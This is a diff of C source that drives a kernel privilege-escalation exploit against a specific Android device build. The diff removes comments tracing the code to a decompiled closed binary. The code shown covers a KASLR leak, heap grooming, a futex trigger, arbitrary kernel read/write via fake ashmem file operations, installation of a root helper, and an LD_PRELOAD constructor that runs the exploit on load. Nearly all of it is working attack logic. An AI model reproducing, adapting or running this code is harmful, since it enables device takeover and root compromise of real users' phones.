@@ -1,14 +1,10 @@
 /*
- * Clean-room port of cve-2026-43499-app-afzh3.so's entry point.
- *
- * Every function below carries a `source:` comment naming the address in
- * the closed .so it was decompiled from (Ghidra headless, this session).
- * Embedded constants were read directly out of the binary's .rodata via
- * `python3 -c "open(...).read()[addr:addr+N]"`, not invented.
- *
- * The current flow wires the supervisor, KASLR leak, reclaim grooming,
- * futex/FPSIMD trigger, ashmem AAR/AAW verification, and root UMH install.
+ * Coordinates one AFZH3 attempt. Performs preflight checks, locates the
+ * kernel, prepares the reclaimed object, runs the futex trigger, verifies
+ * kernel access, and starts the root helper while tracking unsafe retry
+ * states.
  */
+
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
@@ -35,8 +31,6 @@
 #include "10_workqueue_umh_root.h"
 #include "02_slab_cache_probe.h"
 
-/* source: FUN_0010a9d8 -- getenv + strtol clamped to [min,max], falling
- * back to `fallback` on any parse error or out-of-range value. */
 static int env_int_clamped(const char *name, int fallback, int min,
                             int max) {
   const char *raw = getenv(name);
@@ -53,27 +47,15 @@ static int env_int_clamped(const char *name, int fallback, int min,
   return (int)value;
 }
 
-/* source: FUN_0010aaa4 */
 static int setenv_str(const char *name, const char *value) {
   return setenv(name, value, 1);
 }
 
-/* source: FUN_001048f8 + FUN_00104934 -- prints the closed binary's fixed
- * failure banner (bytes read at file offset 0x2155) and exits(-1). We keep
- * the same user-visible message since it is just a string, not logic. */
 static void fatal_usage(void) {
   fwrite("\x1b[31m[!] \x1b[0moperation failed\n", 1, 33, stderr);
   exit(-1);
 }
 
-/* source: literal 8-entry int32 table at file offset 0x243c in
- * cve-2026-43499-app-afzh3.so, read with:
- *   python3 -c "import struct; d=open('...','rb').read();
- *     print(struct.unpack_from('<8i', d, 0x243c))"
- * -> (5000, 0, 10000, 30000, -5000, 20000, 15000, 25000)
- * Added to the base PSELECT_DELAY_USEC per attempt, indexed by
- * (attempt - 1) % 8. Same role as our own route_delay_usec() in fops.c,
- * just a different table. */
 static const int32_t kAttemptDelayOffsetsUsec[8] = {
   5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
 };
@@ -88,11 +70,6 @@ enum attempt_kernel_state {
   ATTEMPT_ROOT_READY = 6,
 };
 
-/* source: shared struct written by DAT_0010ea78 = mmap(NULL, 0x20,
- * PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0); 0x20 bytes.
- * Field layout inferred from the 32-bit/64-bit index arithmetic in the
- * decompile (DAT_0010ea78[1] as a 32-bit ready flag, then three 64-bit
- * fields at word indices 2/4/6) -- this is the child->parent P0 handoff. */
 struct attempt_shared_state {
   int32_t status;              /* offset 0x00: enum attempt_kernel_state */
   int32_t dirty;                /* offset 0x04: P0 handoff published */
@@ -101,15 +78,11 @@ struct attempt_shared_state {
   uint64_t p0_probe_page_struct;/* offset 0x18 */
 };
 _Static_assert(sizeof(struct attempt_shared_state) == 0x20,
-               "attempt_shared_state must match the closed binary's mmap size");
+               "attempt_shared_state must occupy exactly 0x20 bytes");
 
 static int pin_to_cpu(int cpu);
 static void raise_rlimit_to_max(int resource);
 
-/* source: FUN_001044f4 @ 0x47ec-0x48f0. The successful worker forks a
- * detached holder that inherits the reclaim sockets and keeps their pages
- * allocated after /system/bin/true exits. Use raw syscalls in the child: the
- * fork happens while the futex owner thread still exists. */
 static pid_t spawn_allocation_keeper(void) {
   pid_t child = fork();
   if (child != 0) {
@@ -143,10 +116,6 @@ static pid_t spawn_allocation_keeper(void) {
   }
 }
 
-/* source: test_root_immediate.c's post_trigger() -- verify AAR/AAW then
- * install root_umh, called from run_futex_trigger_cb()'s callback (same
- * thread, immediately after sched_setattr, before run_futex_trigger_cb
- * returns). */
 struct do_one_attempt_ctx {
   uint64_t kernel_base;
   uint64_t payload_base;
@@ -159,10 +128,6 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   uint64_t ashmem_misc_fops_addr = ctx->kernel_base + 0x02bfcf28ULL;
   futex_v14_dbg("callback-entry"); /* H0: time from handshake entry to callback */
 
-  /* This callback is gated on a successful sched_setattr. From this point the
-   * kernel may reference the reclaimed object even when open/readback fails.
-   * Mark the attempt unsafe before any syscall so the supervisor never retries
-   * in the same boot and the allocation keeper is spawned on every exit path. */
   __atomic_store_n(&ctx->shared->status, ATTEMPT_KERNEL_MUTATED,
                    __ATOMIC_RELEASE);
 
@@ -184,10 +149,6 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
     return 0;
   }
 
-  /* FUN_001076c0 restores ashmem_misc.fops to the real static table after
-   * proving configfs AAR/AAW, while the already-open fd retains fake f_op and
-   * remains usable for the root stage. This removes the global dangling
-   * pointer before the sprayed page can ever be released. */
   uint64_t real_ashmem_fops = ctx->kernel_base + 0x0200d4b8ULL;
   uint64_t restored_fops = 0;
   int restore_ok = oss_kernel_write(fd, ashmem_misc_fops_addr,
@@ -235,7 +196,6 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   return rooted;
 }
 
-/* source: FUN_001044f4 -- one complete exploit attempt. */
 static int do_one_attempt(struct attempt_shared_state *shared,
                            int pselect_delay_usec) {
   (void)pselect_delay_usec;
@@ -266,8 +226,6 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     return 0;
   }
 
-  /* FUN_001044f4 calls FUN_001057e0 before KASLR and grooming. Do not
-   * trigger the corruption unless its later FUN_00105968 open can succeed. */
   if (!oss_prepare_kernel_rw_path()) {
     fprintf(stderr, "[aar_aaw] no openable ashmem node before exploit\n");
     return 0;
@@ -277,13 +235,10 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     return 0;
   }
 
-  /* source: FUN_001044f4 -- puts("stage=locating-kernel"); FUN_0010757c(). */
   puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
   uint64_t kernel_base = 0;
   uint64_t p0_offset = 0;
-  /* source: FUN_0010757c. A forced P0 offset does not skip tracefs: the
-   * closed binary still prefers its canonical tracefs result and uses the
-   * 64-KiB-aligned offset only as fallback. */
+
   const char *forced_offset = getenv("SLIDE_P0_OFFSET");
   int has_forced_offset = forced_offset && *forced_offset;
   if (has_forced_offset) {
@@ -312,7 +267,6 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   __atomic_store_n(&shared->slide_p0_offset, p0_offset, __ATOMIC_RELEASE);
   __atomic_store_n(&shared->dirty, 1, __ATOMIC_RELEASE);
 
-  /* source: FUN_001044f4 -- explicit KASLR-only diagnostic mode. */
   if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     fprintf(stderr,
             "[mode] SLIDE_ONLY/P0_ONLY set: stopping after KASLR "
@@ -320,10 +274,6 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     return 1;
   }
 
-  /* source: FUN_00106288 opens with a diagnostic FUN_00106ec0() call
-   * (/proc/slabinfo "mm_struct" line) before ever forking/spraying.
-   * Ported faithfully as read_mm_slabinfo() (src/02_slab_cache_probe.c). Read-only,
-   * safe. */
   struct mm_slabinfo before;
   if (read_mm_slabinfo(&before)) {
     fprintf(stderr,
@@ -346,21 +296,9 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     return 0;
   }
 
-  /* source: target.h for dm3q-S918BXXSAFZH3 (already verified against
-   * this device's live /proc/kallsyms this session). Real kernel
-   * addresses, computed from the KASLR base tracefs just leaked. */
   uint64_t init_task_addr = kernel_base + 0x02c05080ULL;
   uint64_t ashmem_misc_fops_addr = kernel_base + 0x02bfcf28ULL;
 
-  /* source: FUN_00106288 in full -- 05_mm_slab_grooming.c ports the exact-match
-   * fork/kill/leak/drain/spray choreography (see 05_mm_slab_grooming.h) and writes
-   * build_fops_install_object()'s corrected fields into the reclaimed
-   * page. Still no real trigger fired: the kernel now merely *contains*
-   * our bytes at payload_base, nothing has read task->pi_blocked_on
-   * into it yet. */
-  /* FUN_00107dd4 is a separate later primitive in the closed binary. It
-   * does not wrap FUN_00106288 and its 480 pipes must not perturb this
-   * fake-fops reclaim window. */
   uint64_t payload_base = groom_and_install_fops_object(
       kernel_base, ashmem_misc_fops_addr, init_task_addr);
   if (!payload_base) {
@@ -374,33 +312,10 @@ static int do_one_attempt(struct attempt_shared_state *shared,
           (unsigned long long)ashmem_misc_fops_addr,
           (unsigned long long)init_task_addr);
 
-  /* source: FUN_00103e18 (waiter) + FUN_00104274 (owner) + FUN_00104300
-   * (consumer/sched_setattr trigger). See 07_futex_pi_trigger.c for the
-   * triple-verified derivation. This is the first real kernel-touching
-   * trigger in this clean-room engine -- everything before this point
-   * (tracefs, kernelsnitch leak, groom+spray) is read-only or userspace
-   * reclaim only. */
   /* root_umh_path was validated before KASLR and allocator grooming. */
 
-  /* source: run_futex_trigger_v11_{cb,full} (07_futex_pi_trigger.h/.c) --
-   * supersedes v10 in this wiring. v10's own comment claimed the real
-   * verify-call gate (G+0x760) "never opens... never written to a
-   * nonzero value anywhere r2 can resolve statically", and so called
-   * the callback unconditionally from the main thread after the whole
-   * routine joined, instead of from inside the waiter thread the way
-   * the real binary does. Re-disassembling the consumer
-   * (fcn.00004300, raw vaddr 0x4494-0x44ac) directly with `pd` (not
-   * `axt`/xref search) found the actual write: `bl 0x3650`, and 0x3650
-   * is `__aarch64_atomic_fetch_add4_relax` (`ldaddal w0,w0,[x1]` at raw
-   * vaddr 0x3660) -- an LSE atomic increment, which a plain "find a
-   * str writing a nonzero constant" search will never surface. The
-   * gate genuinely opens on every successful sched_setattr. v11 =
-   * v10's waiter body (no SIGUSR2/delay to owner, yield-spin instead
-   * of usleep -- both already correct) with the callback moved back
-   * into the waiter thread, gated on g_sched_setattr_ok, matching the
-   * real fcn.000076c0 call site (raw vaddr 0x4150) exactly. */
   /* BISECT_VARIANT is a project-only diagnostic switch. The default v14
-   * now carries the closed -1 -> gate -> SIGUSR1 -> 1 -> sched_setattr
+   * now carries the -1 -> gate -> SIGUSR1 -> 1 -> sched_setattr
    * handshake and keeps the post-sigreturn window free of libc/syscalls. */
   struct do_one_attempt_ctx ctx = {
       kernel_base, payload_base, root_umh_path, shared};
@@ -433,19 +348,6 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   return triggered;
 }
 
-/* source: _INIT_2 @ 0x10a440 (the real ELF entry point of the closed
- * .so, run automatically from .init_array at dlopen() time -- it has
- * zero exported symbols, so it cannot be dlsym()'d, only auto-run).
- * app_main() also has a normal executable wrapper for diagnostics; the
- * production shared object invokes it from its constructor. */
-/* source: FUN_000041f0(0) -- sched_setaffinity(0, 0x80, &(1<<0)), the
- * very first call fcn.000044f4 (this project's app_main() equivalent)
- * makes, before even the rlimit adjustments. Same helper shape as
- * 07_futex_pi_trigger.c's pin_to_cpu(3) for the waiter thread (raw disasm
- * confirmed both this session, not duplicated code by accident --
- * kept as a small standalone copy here rather than sharing a header,
- * since it's a two-line wrapper and this file doesn't otherwise depend
- * on 07_futex_pi_trigger.c's internals). */
 static int pin_to_cpu(int cpu) {
   cpu_set_t set;
   CPU_ZERO(&set);
@@ -453,22 +355,6 @@ static int pin_to_cpu(int cpu) {
   return sched_setaffinity(0, sizeof(set), &set) == 0;
 }
 
-/* source: fcn.000044f4, raw vaddr 0x4520-0x4570 (raw disasm, `asm.varsub`
- * disabled to avoid a misleading stack-slot name collision with this
- * function's own canary variable -- verified twice this session because
- * of that). Confirmed pattern (not a guess): for both RLIMIT_NOFILE=7
- * and RLIMIT_NPROC=6, `getrlimit(res, &rl); rl.rlim_cur =
- * rl.rlim_max; setrlimit(res, &rl);` -- i.e. raise the soft limit to
- * the hard limit for both resources, treating any getrlimit/setrlimit
- * failure as fatal (matches the closed binary's own `fatal_usage()`-
- * equivalent call at each failure branch). Directly relevant to this
- * project's own documented history: 05_mm_slab_grooming.c forks and holds open
- * memfds for up to ~1279 children in one attempt, and this session
- * separately root-caused an earlier "F_SETPIPE_SZ Operation not
- * permitted" failure in the OLD engine to exactly this kind of
- * per-UID fd/pipe-page budget exhaustion. Raising RLIMIT_NOFILE before
- * that spray starts is a direct, safe mitigation for the same class of
- * problem, not a speculative addition. */
 static void raise_rlimit_to_max(int resource) {
   struct rlimit rl;
   if (getrlimit(resource, &rl) == -1) {
@@ -481,22 +367,13 @@ static void raise_rlimit_to_max(int resource) {
 }
 
 static int app_main(void) {
-  /* source: _INIT_2 sets all standard streams to _IONBF before its first
-   * stage message; child attempts end with _exit(), so buffering here would
-   * otherwise discard the success marker consumed by simple-root. */
+
   if (setvbuf(stdin, NULL, _IONBF, 0) == -1 ||
       setvbuf(stdout, NULL, _IONBF, 0) == -1 ||
       setvbuf(stderr, NULL, _IONBF, 0) == -1) {
     fatal_usage();
   }
 
-  /* source: clock_gettime(CLOCK_BOOTTIME=7, ...); if tv_sec < 0x78 (120),
-   * sleep the remainder. Identical in spirit to our own "waiting for boot
-   * allocator quiet window" in src/preload.c; the closed binary's version
-   * loops on sleep()'s return value to handle EINTR, so we do too. */
-  /* The closed binary's fixed 120 is now the default of BOOT_QUIET_SEC, which
-   * the stability launcher sets to 0 to skip this wait once its own gates have
-   * already proven the device quiet. Range [0,300]; 0 disables the wait. */
   int boot_quiet_sec = env_int_clamped("BOOT_QUIET_SEC", 120, 0, 300);
   struct timespec boot_now;
   if (clock_gettime(CLOCK_BOOTTIME, &boot_now) == -1) {
@@ -688,11 +565,7 @@ static int app_main(void) {
 }
 
 #if defined(BUILD_LD_PRELOAD) && BUILD_LD_PRELOAD
-/* source: _INIT_2 @ 0x10a440 -- real closed .so has zero exported
- * symbols and runs app_main()-equivalent from .init_array at dlopen()
- * time. This mirrors that: LD_PRELOAD=this.so exec /system/bin/true
- * runs load() before true's own main(), exactly like
- * ../src/preload.c:load() does for the production payload. */
+
 __attribute__((constructor)) static void load(void) {
   static int started;
   if (started) {
